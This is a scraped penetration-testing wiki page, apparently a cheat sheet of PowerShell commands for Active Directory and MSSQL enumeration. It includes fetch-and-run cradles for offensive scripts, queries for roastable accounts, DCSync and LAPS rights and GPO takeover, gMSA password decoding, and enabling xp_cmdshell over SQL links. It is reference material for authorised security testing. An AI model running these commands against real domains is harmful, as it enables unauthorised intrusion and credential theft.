["https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration"]
title = "Active Directory Enumeration | Pentest Everything"
full_description = '''EverythingEverything Active Directory and WindowsActive Directory EnumerationThis page is a long term work in progress page and will be subject to multiple changes overtime.Powerview (Dev) build is used heavily for the following page.Enumeration ToolsadPEAS: https://github.com/61106960/adPEASBloodHound: https://github.com/BloodHoundAD/BloodHoundInvoke-ADEnum: https://github.com/Leo4j/Invoke-ADEnumPowerUpSQL: https://github.com/NetSPI/PowerUpSQLPowerview: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1Pywerview: https://github.com/the-useless-one/pywerviewCopy# adPEAS IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1);Invoke-adPEAS IEX(IWR -usebasicparsing https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS-Light.ps1);Invoke-adPEAS # BloodHound IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" IEX(IWR -usebasicparsing https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod "All,GPOLocalGroup" -Loop -Loopduration 06:00:00 -LoopInterval 00:15:00 # Invoke-ADEnum IEX(IWR -UseBasicParsing https://raw.githubusercontent.com/Leo4j/Invoke-ADEnum/main/Invoke-ADEnum.ps1);Invoke-ADEnum # PowerUpSQL IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1") # PowerView IEX(IWR -usebasicparsing https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1)Native AD ModuleCopyiex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectoryGeneral EnumerationDomain Computer EnumerationCopy# List all computers in current Domain Get-DomainComputer Get-DomainComputer | Select Name,Description | Sort Name # Ping all alive computers in current Domain Get-DomainComputer -Ping # List all computers with select Operating System Get-DomainComputer -OperatingSystem "Windows 10 Pro" Get-DomainComputer -OperatingSystem "Windows 7*" Get-DomainComputer -OperatingSystem "Windows 8*" Get-DomainComputer -OperatingSystem "Windows xp*" # Get Computer objects that have Unconstrained Delegation Get-DomainComputer -UnconstrainedDomain EnumerationCopy# Domain Information Get-NetDomain # Domain Policy Information Get-DomainPolicy (Get-DomainPolicy)."SystemAccess" (Get-DomainPolicy –domain <Domain>)."systemaccess" (Get-DomainPolicy)."KerberosPolicy" # Get Domain SID Get-DomainSIDDomain Controller Enumeration Copy# Get all Domain Dontrollers Get-NetDomainController # Get Primary Domain Controller Get-NetDomain | Select-Object 'PdcRoleOwner' # Get Domain Controller in different Domain Get-NetDomainController -Domain <Domain>Domain Policy EnumerationCopyGet-DomainPolicy (Get-DomainPolicy)."system access" (Get-DomainPolicy)."Kerberos Policy"Domain Trust EnumerationCopy# Enumerate all Domains in the forest Get-NetForestDomain # Get all Domains in Forest then list each Domain trust Get-NetForestDomain -Verbose | Get-DomainTrust # Map all reachable Domain trusts Get-DomainTrustMapping Get-DomainTrustMapping | Select SourceName,TargetName,TrustType,TrustDirection # List external trusts Get-NetForestDomain -Verbose | Get-DomainTrust |?{$_.TrustType -eq 'External'} # Enumerate trusts across the domain Get-DomainTrust # Find users in the current Domain that reside in Groups across trusts Find-ForeignUserForest EnumerationCopy# Get details about current Forest Get-NetForest Get-NetForest -Forest <Forest> # Get all Domains in current Forest Get-NetForestDomain Get-NetForestDomain -Forest <Forest> # Get global catalogs in current Forest Get-NetForestCatalog Get-NetForestCatalog -Forest <Forest> # Map Forest trusts Get-NetForestTrust Get-NetForestTrust -Forest <Forest>Group EnumerationCopy# List all Groups in current Domain Get-NetGroup Get-NetGroup -Properties SamAccountName | Sort SamAccountName # List all Groups in alternative Domain Get-NetGroup –Domain <Domain> # Search for Groups with partial wildcard Get-NetGroup "*admin*" Get-NetGroup "*admin*"-Properties SamAccountName | Sort SamAccountName # List all local groups on Domain system Get-NetLocalGroup -ComputerName <Hostname> # Identify interesting groups on a Domain Controller Get-NetDomainController | Get-NetLocalGroup # Get all domain controllers then get each group and list members Get-NetDomainController | Get-NetLocalGroup | Select -ExpandProperty GroupName | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName # Get All groups and members of groups Get-NetGroup | Get-NetGroupMember | Select GroupName,MemberName | Sort GroupName # List Groups of which a user is a member of (Recursive) Get-DomainGroup -MemberIdentity "<User>" Get-DomainGroup -MemberIdentity "<Group>"Group Managed Service AccountsCopy# Enumerate GMSA accounts # Powerview Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)' # AD Module Get-ADServiceAccount -Filter * # AD Module # Enumerate users who can retrieve the password Get-ADServiceAccount -Identity [Identity] -Properties * | select PrincipalsAllowedToRetrieveManagedPassword # Decode the password blob and convert to NT hash. (Run in context of user who has permissions to read the password # https://github.com/The-Viper-One/RedTeam-Binaries/raw/main/GMSAPasswordReader.exe .\GMSAPasswordReader.exe --accountname [GMSA-Account]Group Policy EnumerationCopy# Get GPO's in Domain Get-DomainGPO Get-DomainGPO -Properties DisplayName,CN # Get GPO applied to specific OU Get-DomainGPO -ADSpath ` ((Get-NetOU "StudentMachines" -FullData).gplink.split(";")[0] -replace "^.") # Get each OU and enumerate GPOs applied to each $OUs = Get-DomainOU -Properties displayName, gplink; foreach ($OU in $OUs) { $FilteredLDAP = $OU.gplink -replace '.*\{(.+?)\}.*', '{$1}'; Write-Host "OU: $($OU.displayName)" -ForegroundColor "Yellow"; Get-DomainGPO -Identity $FilteredLDAP; Write-Host } # Get GPO applied to system Get-DomainGPO -ComputerIdentity <FQDN> Get-DomainGPO -ComputerIdentity <FQDN> | Select DisplayName,CN # Get GPO applied to a User Get-DomainGPO -UserIdentity <SamAccountName> Get-DomainGPO -UserIdentity <SamAccountName | Select DisplayName,CN # Get GPO Restricted Groups Get-NetGPOGroup Get-NetGPOGroup -ResolveMembersToSIDs # Get GPO Restricted Groups and list each member of the groups $GroupNames = Get-NetGPOGroup -ResolveMembersToSIDs | Select-Object -ExpandProperty "GroupName" ; foreach ($GroupName in $GroupNames) {$ModifiedGroupName = $GroupName -replace '^.*\\' ; Get-DomainGroupMember -Identity $ModifiedGroupName} # Get users which are in a local group of a machine using GPO Find-GPOComputerAdmin –Computername <FQDN> # Determines what users/groups are in the specified local group for the machine through GPO correlation Find-GPOLocation -ComputerName <FQDN> # Get GPO Permissions Get-DomainGPO | Get-ObjectAclFind GPO's vulnerable to takeoverCopy# Search for GPO's which may be vulnerable to takeover Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } # Resolve the SID to identify the principal Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath # Resolve the SID ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107Organizational Units EnumerationCopy# Get all OU's in Domain Get-DomainOU Get-DomainOU -Domain <Domain> Get-DomainOU -Properties OU,DistinguishedName | Sort OU # Get all OU names by wildcard Get-DomainOU "*admin*" Get-DomainOU "*test*" Get-DomainOU "*server*" Get-DomainOU "*work*"User EumerationCopy# List all user accounts in Domain Get-DomainUser # List enabled user accounts Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,SamAccountName,Description | Sort Name Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties Name,Description,pwdlastset,badpwdcount | Sort Name # List specific user account Get-DomainUser -Username <Username> # Getcurrently logged on users from selected system Get-NetLoggedon -ComputerName <Hostname> # Get last logged user on a remote computer (Requires admin and remote registry) Get-LastLoggedOn -ComputerName <Hostname> # Get kerberoastable users Get-DomainUser -SPN | select Name,SrvicepPincipalnNme # Get AS-REP roastable users Get-DomainUser -PreauthNotRequired | select Name # Search for string in User Description field Get-DomainUser -Properties samaccountname,description | Where {$_.description -ne $null} # Search for string in userPassword field Get-DomainUser -Properties userPassword | Where {$_.userPassword -ne $null} # Search for string in unixUserPassword field Get-DomainUser -Properties unixUserPassword | Where {$_.unixUserPassword -ne $null}OtherAccess Control ListsCopy# Get current domain SID and find interesting properties $SID = Get-DomainSid ; Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$SID-[\d]{4,10}" } # Find interesting ACL's for current user Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReference –eq [System.Security.Principal.WindowsIdentity]::GetCurrent().Name} # Get ACLs for specific AD Object Get-DomainObjectAcl -SamAccountName <SAM> -ResolveGUIDs Get-DomainObjectAcl -Identity <Identity> -ResolveGUIDs # Get ACLs for specified prefix Get-DomainObjectAcl -ADSprefix 'CN=Administrators,CN=Users' -Verbose # Search for interesting ACEs Find-InterestingDomainAcl -ResolveGUIDs Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReference -match "Domain Users"} Find-InterestingDomainAcl -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" # Get ACLs for select groups Get-DomainObjectACL -identity "Domain Admins" -ResolveGUIDs | ?{ $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" # Find Interesting ACLs from groups we are a member of Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "Standard-Users"} # Find Interesting ACLs for groups a user is a member of (Recursive) Get-DomainGroup -MemberIdentity "[User]" | Select-Object -ExpandProperty "SamAccountName" | ForEach-Object { Write-Host "Searching for interesting ACLs for $_" -ForegroundColor "Yellow"; Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match $_ } } # Get ACL for specific path Get-PathACL -Path "\\Security.local\SYSVOL" # Get the ACLs associated with the specified LDAP path to be used for search Get-DomainObjectAcl -ADSpath "LDAP://CN=DomainAdmins,CN=Users,DC=Security,DC=local" -ResolveGUIDs -VerboseAppLocker / WDACCopy# Search local system to see if AppLocker used. An error will officure if not in use reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2 # Search for AppLocker policy with PowerShell on the local system Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections # Check local system to see if WDAC is installed Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard # Search for GPOs that might be related to AppLocker Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppL*" } | select displayname, gpcfilesyspathAS-REP Roastable UsersCopyGet-DomainUser -PreauthNotRequired | select UserPrincipalNameKerberoastable UsersPowerViewCopyGet-DomainUser -SPN | Select SamAccountName,serviceprincipalname | Sort SamAccountNameDCSync RightsPowerViewCopy# Ensure the Base path below is set to the root of the domain $d = Get-ObjectACL "DC=Domain,DC=local" -ResolveGUIDs | ? { ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ObjectAceType -match 'Replication-Get')} | Select-Object -ExpandProperty SecurityIdentifier | Select -ExpandProperty value ; Convert-SidToName $dDelegation - ConstrainedCopy# Get computer Constrained Delegation Get-DomainComputer -TrustedToAuth| Select DnsHostName,UserAccountControl,msds-allowedtodelegateto | FL # Get user Constrained Delegation Get-DomainUser -TrustedToAuthDelegation - UnconstrainedCopy# Get computers with unconstrained delegation Get-DomainComputer -Unconstrained | Select DnsHostName,UserAccountControlDeleted UsersIf we are a member of the AD group "AD Recycle Bin" we can view deleted user objects in PowerShell.CopyGet-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *LAPS EnumerationLAPS DelegationThe following can be used to identify what objects have the ability to read the LAPS passwords for identified systems in the domain.CopyGet-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier); $_ }Machine Account QuotaCopy$Domain = "$env:userdnsdomain" $LDAP = "DC=" + $Domain.Split(".") $LDAP = $LDAP -replace " ", ",DC=" (Get-DomainObject -Identity $LDAP -Properties ms-DS-MachineAccountQuota) | Select-Object -ExpandProperty ms-DS-MachineAccountQuotaMSSQL EnumerationCopy# Dsicover SQL related groups Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }PowerUpSQLCopy# Discovery (SPN Scanning) Get-SQLInstanceDomain # Discovery (Broadcast Domain) Get-SqlInstanceBroadcast # Discovery (Broadcast Domain) Get-SqlInstanceScanUDP Get-SqlInstanceScanUDPThreaded # Check Accessibility Get-SQLConnectionTestThreaded Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose #Gather Information Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose # Search for database links to remote servers Get-SQLServerLink -Instance <Instance> -Verbose Get-SQLServerLinkCrawl -Instance <Instance> -Verbose # Where instance user matches "sa" Get-SQLServerLinkCrawl -Instance <Instance> | Where-Object {$_.User -match 'sa'} # Execute commands ( If xp_cmdshell or RPC out is set to enabled) # If AV is enabled run cradled scripts with functions inline with the script EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "<Instance>" Get-SQLServerLinkCrawl -Instance <Instance> "exec master..xp_cmdshell 'whoami'" -Query # Scan for misconfigurations and vulnerabilities Invoke-SQLAudit -Verbose -Instance <Server>SQL CommandsCopy# Search for database links select * from master..sysservers # Manually searching for Database Links select * from openquery("<Server>",'select * from master..sysservers') # Openquery queries can be chained to access links within links (nested links) select * from openquery("dcorp-sql1",'select * from openquery("<Server>",''select * from master..sysservers'''
